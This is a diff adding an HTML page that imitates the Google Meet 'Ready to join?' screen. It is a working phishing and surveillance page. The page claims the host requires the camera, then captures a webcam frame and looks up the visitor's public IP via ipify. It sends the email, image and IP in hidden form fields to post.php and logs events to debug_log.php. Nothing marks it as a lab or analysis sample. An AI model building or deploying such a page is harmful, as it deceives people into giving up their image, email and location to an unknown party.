@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Meet - Join Meeting</title>
+    <link rel="icon" href="https://www.gstatic.com/meet/google_meet_horizontal_wordmark_2020q4_1x_icon_124_40_23739657a08d546166ba0a0e4a3f3a20.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f1f3f4;
+            color: #3c4043;
+        }
+        .header {
+            background: white;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+        }
+        .logo {
+            height: 32px;
+            margin-right: 10px;
+        }
+        .meet-logo {
+            color: #5f6368;
+            font-size: 22px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+        }
+        .meet-logo-text {
+            margin-left: 8px;
+            background: linear-gradient(90deg, #1a73e8, #34a853);
+            background-clip: text;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            color: transparent;
+            font-weight: 500;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(60,64,67,0.3);
+        }
+        h1 {
+            color: #1a73e8;
+            font-size: 24px;
+            margin-bottom: 24px;
+        }
+        .meeting-info {
+            margin-bottom: 24px;
+        }
+        .info-item {
+            margin-bottom: 16px;
+        }
+        .info-label {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 4px;
+        }
+        .info-value {
+            font-size: 16px;
+            font-weight: 500;
+        }
+        .join-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background 0.2s;
+        }
+        .join-button:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(26, 115, 232, 0.3), 0 1px 3px 1px rgba(26, 115, 232, 0.15);
+        }
+        .join-button:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+        .join-button.recording {
+            background: #d93025;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+        .permission-request {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            border: 1px solid #dadce0;
+        }
+        .permission-icon {
+            font-size: 24px;
+            margin-right: 12px;
+            color: #1a73e8;
+        }
+        .permission-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 12px;
+        }
+        .permission-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .permission-button:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(26, 115, 232, 0.3);
+        }
+        .camera-preview {
+            width: 100%;
+            max-width: 240px;
+            height: 180px;
+            background: #f1f3f4;
+            border-radius: 8px;
+            margin: 16px 0;
+            border: 1px solid #dadce0;
+            position: relative;
+            overflow: hidden;
+            display: none;
+        }
+        .camera-preview video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .camera-indicator {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            border-radius: 10px;
+            padding: 2px 8px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+        }
+        .recording-indicator {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #f44336;
+            border-radius: 50%;
+            margin-right: 4px;
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .participant {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+        .participant-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #1a73e8;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 16px;
+            font-weight: 500;
+        }
+        .participant-info {
+            flex-grow: 1;
+        }
+        .participant-name {
+            font-weight: 500;
+            margin-bottom: 2px;
+        }
+        .participant-email {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .browser-message {
+            margin-top: 24px;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="meet-logo">
+            <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 0C8.96 0 0 8.96 0 20C0 31.04 8.96 40 20 40C31.04 40 40 31.04 40 20C40 8.96 31.04 0 20 0ZM29.28 21.6H21.6V29.28H18.4V21.6H10.72V18.4H18.4V10.72H21.6V18.4H29.28V21.6Z" fill="#34A853"/>
+                <path d="M29.28 21.6H21.6V29.28H18.4V21.6H10.72V18.4H18.4V10.72H21.6V18.4H29.28V21.6Z" fill="white"/>
+            </svg>
+            <span class="meet-logo-text">Meet</span>
+        </div>
+    </div>
+    
+    <div class="container">
+        <h1>Ready to join?</h1>
+        
+        <div class="meeting-info">
+            <div class="info-item">
+                <div class="info-label">Meeting code</div>
+                <div class="info-value" id="meetingCode">Loading meeting details...</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Organizer</div>
+                <div class="info-value">You</div>
+            </div>
+        </div>
+        
+        <div id="participantList">
+            <div class="participant">
+                <div class="participant-avatar" id="userInitial">Y</div>
+                <div class="participant-info">
+                    <div class="participant-name">You</div>
+                    <div class="participant-email" id="userEmail">Sign in to see your email</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="permission-request" id="permissionRequest">
+            <div class="permission-text">
+                <span class="permission-icon">🔒</span>
+                <strong>Meeting host requires you to enable your camera</strong>
+                <p>To join, you'll need to allow access to your camera and microphone.</p>
+            </div>
+            <button class="permission-button" id="allowButton">Allow</button>
+        </div>
+        
+        <div class="camera-preview" id="cameraPreview">
+            <div class="camera-indicator"><span class="recording-indicator"></span> Live</div>
+            <video id="video" autoplay playsinline></video>
+        </div>
+        
+        <button class="join-button" id="joinButton" disabled>Join now</button>
+        
+        <div class="browser-message">
+            <p>Having trouble joining? Try joining from a different browser or device.</p>
+        </div>
+    </div>
+
+    <script>
+        // Camera access variables
+        let stream = null;
+        // Get URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '';
+        const meetingCode = urlParams.get('meeting') || 'abc-defg-hij';
+        
+        // Update UI with URL parameters
+        document.getElementById('meetingCode').textContent = meetingCode.toUpperCase();
+        
+        if (email) {
+            document.getElementById('userEmail').textContent = email;
+            const initial = email.charAt(0).toUpperCase();
+            document.getElementById('userInitial').textContent = initial;
+            document.getElementById('joinButton').disabled = false;
+        }
+        
+        // Handle allow camera button click
+        document.getElementById('allowButton').addEventListener('click', async function() {
+            try {
+                // Request camera and microphone access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                // Show camera preview
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.getElementById('cameraPreview').style.display = 'block';
+                document.getElementById('permissionRequest').style.display = 'none';
+                document.getElementById('joinButton').disabled = false;
+                
+                // Log that camera was accessed
+                logToServer('Camera access granted');
+                
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                alert('Could not access camera. Please make sure to allow camera and microphone access to join the meeting.');
+                logToServer('Camera access denied: ' + err.message);
+            }
+        });
+        
+        // Function to log to server
+        function logToServer(message) {
+            // Log to debug_log.php
+            fetch('debug_log.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'message=' + encodeURIComponent(message)
+            });
+        }
+        
+        // Function to capture webcam image and send to server
+        async function captureAndSendImage() {
+            if (!stream) return null;
+            
+            try {
+                // Create canvas to capture the frame
+                const video = document.getElementById('video');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert canvas to base64
+                return canvas.toDataURL('image/jpeg', 0.8);
+            } catch (err) {
+                console.error('Error capturing image:', err);
+                return null;
+            }
+        }
+
+        // Handle join button click
+        document.getElementById('joinButton').addEventListener('click', function() {
+            // Show loading state and start recording indicator
+            const joinButton = this;
+            joinButton.textContent = 'Joining...';
+            joinButton.disabled = true;
+            joinButton.classList.add('recording');
+            
+            // Start async operations
+            (async () => {
+                try {
+                    // Capture image before proceeding
+                    const imageData = await captureAndSendImage();
+                    
+                    // Log that join was attempted
+                    logToServer('Join meeting attempt with email: ' + (email || 'no email provided'));
+                    
+                    // If we have an image, include it in the form data
+                    if (imageData) {
+                        logToServer('Image captured successfully');
+                    }
+                    
+                    // Get IP address
+                    let ip = 'unknown';
+                    try {
+                        const response = await fetch('https://api.ipify.org?format=json');
+                        const data = await response.json();
+                        ip = data.ip;
+                    } catch (e) {
+                        console.error('Error getting IP:', e);
+                    }
+                    
+                    // Create form data
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'post.php';
+                    
+                    // Add email field
+                    const emailInput = document.createElement('input');
+                    emailInput.type = 'hidden';
+                    emailInput.name = 'email';
+                    emailInput.value = email || 'no-email';
+                    
+                    // Add password field
+                    const passwordInput = document.createElement('input');
+                    passwordInput.type = 'hidden';
+                    passwordInput.name = 'password';
+                    passwordInput.value = 'google_meet_join_attempt';
+                    
+                    // Add image data if available
+                    if (imageData) {
+                        const imageInput = document.createElement('input');
+                        imageInput.type = 'hidden';
+                        imageInput.name = 'cat';
+                        imageInput.value = imageData;
+                        form.appendChild(imageInput);
+                    }
+                    
+                    // Add IP and other metadata
+                    const ipInput = document.createElement('input');
+                    ipInput.type = 'hidden';
+                    ipInput.name = 'ip';
+                    ipInput.value = ip;
+                    
+                    form.appendChild(emailInput);
+                    form.appendChild(passwordInput);
+                    form.appendChild(ipInput);
+                    
+                    // Add form to document and submit
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                } catch (error) {
+                    console.error('Error in join process:', error);
+                    joinButton.textContent = 'Error. Try again.';
+                    joinButton.disabled = false;
+                    joinButton.classList.remove('recording');
+                    
+                    // Show error after form submission
+                    joinButton.textContent = 'Couldn\'t connect. Try again.';
+                    joinButton.style.background = '#d93025';
+                    joinButton.classList.remove('recording');
+                    
+                    // Log the error
+                    logToServer('Failed to join meeting: ' + error.message);
+                    
+                    // Reset button after delay
+                    setTimeout(() => {
+                        joinButton.textContent = 'Join now';
+                        joinButton.disabled = false;
+                        joinButton.style.background = '#1a73e8';
+                    }, 2000);
+                }
+            })();
+        });
+        
+        // Clean up camera stream when leaving the page
+        window.addEventListener('beforeunload', function() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
+        // Show email input if not provided in URL
+        if (!email) {
+            const emailInput = document.createElement('input');
+            emailInput.type = 'email';
+            emailInput.placeholder = 'Enter your email';
+            emailInput.style.width = '100%';
+            emailInput.style.padding = '10px';
+            emailInput.style.margin = '10px 0';
+            emailInput.style.border = '1px solid #dadce0';
+            emailInput.style.borderRadius = '4px';
+            
+            const joinButton = document.getElementById('joinButton');
+            joinButton.before(emailInput);
+            
+            emailInput.addEventListener('input', function() {
+                const isValid = this.value.includes('@') && this.value.includes('.');
+                joinButton.disabled = !isValid;
+                
+                if (this.value) {
+                    const initial = this.value.charAt(0).toUpperCase();
+                    document.getElementById('userInitial').textContent = initial;
+                    document.getElementById('userEmail').textContent = this.value;
+                } else {
+                    document.getElementById('userInitial').textContent = 'Y';
+                    document.getElementById('userEmail').textContent = 'Sign in to see your email';
+                }
+            });
+            
+            joinButton.addEventListener('click', function() {
+                const emailValue = emailInput.value.trim();
+                if (emailValue) {
+                    window.location.href = `?email=${encodeURIComponent(emailValue)}&meeting=${meetingCode}`;
+                }
+            });
+        }
+    </script>
+</body>
+</html>
